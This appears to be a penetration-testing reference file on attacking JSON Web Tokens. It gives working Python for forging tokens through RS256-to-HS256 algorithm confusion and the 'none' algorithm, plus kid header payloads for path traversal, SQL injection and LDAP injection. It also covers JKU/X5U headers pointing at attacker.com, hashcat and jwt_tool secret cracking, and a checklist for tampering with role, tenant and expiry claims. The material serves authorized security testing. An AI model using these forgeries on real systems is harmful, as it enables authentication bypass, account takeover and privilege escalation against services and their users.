# JWT Attack Techniques

## When to Use

Consult when JWT tokens are identified in Phase 1. Contains specific attack implementations for each JWT vulnerability class.

---

## Algorithm Confusion Attack (RS256 → HS256)

### Concept
The server verifies RS256 tokens using the RSA **public key**. If the server accepts HS256, it will use that same public key as the HMAC **secret**. Since the public key is public, the attacker knows the "secret."

### Step-by-Step

**1. Obtain the public key:**
```bash
# JWKS endpoint
curl https://target/.well-known/jwks.json
curl https://target/oauth/jwks
curl https://target/api/.well-known/openid-configuration

# From SSL certificate
openssl s_client -connect target:443 | openssl x509 -pubkey -noout

# From x5c claim in JWT header
echo "$X5C_VALUE" | base64 -d | openssl x509 -pubkey -noout
```

**2. Convert public key to correct format:**
The key format matters. Most JWT libraries expect PEM format:
```bash
# If JWKS (JSON), convert to PEM:
# Extract n and e from JWK, reconstruct RSA public key
python3 -c "
from jwcrypto import jwk
import json
key_json = '{\"kty\":\"RSA\",\"n\":\"...\",\"e\":\"AQAB\"}'
key = jwk.JWK(**json.loads(key_json))
print(key.export_to_pem().decode())
"
```

**3. Forge token:**
```python
import jwt
import json

# Read the public key
with open('public.pem', 'r') as f:
    public_key = f.read()

# Decode original token to get claims
original = jwt.decode(token, options={"verify_signature": False})

# Modify claims
original['role'] = 'admin'
original['sub'] = 'target_user_id'

# Sign with HS256 using the public key as the secret
forged = jwt.encode(original, public_key, algorithm='HS256')
```

**4. Send forged token and check response.**

### Common Failures
- Server validates `alg` header against a whitelist → properly secured
- Different key for HMAC vs RSA verification → not vulnerable
- Library rejects type mismatch → properly configured

---

## Key ID (kid) Injection

### Path Traversal via kid
```json
{
  "alg": "HS256",
  "kid": "../../../dev/null"
}
```
If the server reads the file at the `kid` path and uses its content as the signing key:
- `/dev/null` → empty file → sign with empty string
- `/etc/hostname` → known content → sign with that content
- `../../app/config/jwt_secret` → actual secret file

**Sign with the known file content:**
```python
import jwt
# For /dev/null - sign with empty string
forged = jwt.encode(payload, '', algorithm='HS256')
```

### SQL Injection via kid
```json
{
  "alg": "HS256",
  "kid": "' UNION SELECT 'attacker-controlled-secret' -- "
}
```
If `kid` is used in a database query, SQLi can force a known secret value.

### LDAP Injection via kid
If `kid` lookups use LDAP:
```json
{
  "alg": "HS256",
  "kid": "key*)(objectClass=*"
}
```

---

## JKU / X5U Header Injection `[EXTERNAL INFRA REQUIRED]`

### JKU (JWK Set URL) Attack
**1. Generate your own RSA key pair:**
```bash
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
```

**2. Create a JWK set with your public key:**
```python
from jwcrypto import jwk
import json

with open('public.pem', 'rb') as f:
    key = jwk.JWK.from_pem(f.read())

jwks = {"keys": [json.loads(key.export())]}
# Host this JSON at your server
```

**3. Forge the JWT header:**
```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/.well-known/jwks.json"
}
```

**4. Sign with your private key.**

### X5U (X.509 URL) Attack
Similar but with X.509 certificate:
```json
{
  "alg": "RS256",
  "x5u": "https://attacker.com/cert.pem"
}
```

### Bypass: Same-Domain Restriction
If `jku`/`x5u` must be on the same domain, chain with:
- Open redirect on the target domain
- File upload that stores your JWK/cert
- Subdomain you control

---

## None Algorithm Attack

### Variations to Try
```json
{"alg": "none"}
{"alg": "None"}
{"alg": "NONE"}
{"alg": "nOnE"}
{"alg": "noNe"}
```

### Token Format
Remove the signature (third segment) but keep the trailing dot:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.
```

Some libraries require the dot, some don't. Test both.

---

## Weak Secret Brute-Force

### Common Weak Secrets
```
secret
password
123456
jwt_secret
changeme
supersecret
your-256-bit-secret
<application-name>
<company-name>
<company-name>-secret
test
development
```

### Using hashcat
```bash
# Extract the JWT
echo -n "$JWT" > jwt.txt

# Crack with wordlist
hashcat -m 16500 jwt.txt wordlist.txt

# Crack with rules
hashcat -m 16500 jwt.txt wordlist.txt -r best64.rule
```

### Using jwt_tool
```bash
python3 jwt_tool.py "$JWT" -C -d wordlist.txt
```

---

## Claim Manipulation Checklist

Even without signature bypass, test if claims are validated:

| Claim to Modify | Test | Impact if Accepted |
|----------------|------|-------------------|
| `exp` | Set to year 2099 | Token never expires |
| `sub` / `user_id` | Change to another user's ID | Identity spoofing |
| `role` / `admin` / `is_admin` | Change to admin/true | Privilege escalation |
| `email` | Change to admin email | Identity spoofing |
| `org_id` / `tenant_id` | Change to different org | Cross-tenant access |
| `scope` / `permissions` | Add admin scopes | Expanded access |
| `iss` | Change issuer | May bypass validation |
| `aud` | Change audience | May access different service |

**Note:** Claim manipulation without signature bypass only works if the secret is cracked or the server doesn't verify signatures properly.
